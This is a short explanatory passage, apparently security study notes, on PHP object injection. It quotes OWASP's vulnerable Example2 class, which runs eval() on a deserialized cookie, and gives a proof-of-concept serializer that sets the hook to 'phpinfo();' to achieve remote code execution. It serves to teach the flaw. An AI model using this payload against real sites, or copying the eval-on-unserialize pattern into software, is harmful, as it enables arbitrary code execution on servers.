# possible exploit
It’s even possible to achieve RCE using PHP object injection! For example, consider this vulnerable code snippet: (taken from [https://www.owasp.org/index.php/PHP\_Object\_Injection](https://www.owasp.org/index.php/PHP_Object_Injection))

```text-plain
class Example2
{
  private $hook;   
  function __construct(){
      // some PHP code...
  }   
  function __wakeup(){
      if (isset($this->hook)) eval($this->hook);
  }
}// some PHP code...$user_data = unserialize($_COOKIE['data']);// some PHP code...
```

You can achieve RCE using this deserialization flaw because a user-provided object is passed into unserialize. And the class Example2 has a magic function that runs **eval()** on user-provided input.

To exploit this RCE, you simply have to set your **data** cookie to a serialized Example2 object with the **hook** property set to whatever PHP code you want. You can generate the serialized object using the following code snippet:

```text-plain
class Example2
{
   private $hook = "phpinfo();";
}print urlencode(serialize(new Example2));
// We need to use URL encoding since we are injecting the object via a URL.
```

Passing the above-generated string into the **data** cookie will cause the code “**phpinfo();”** to be executed.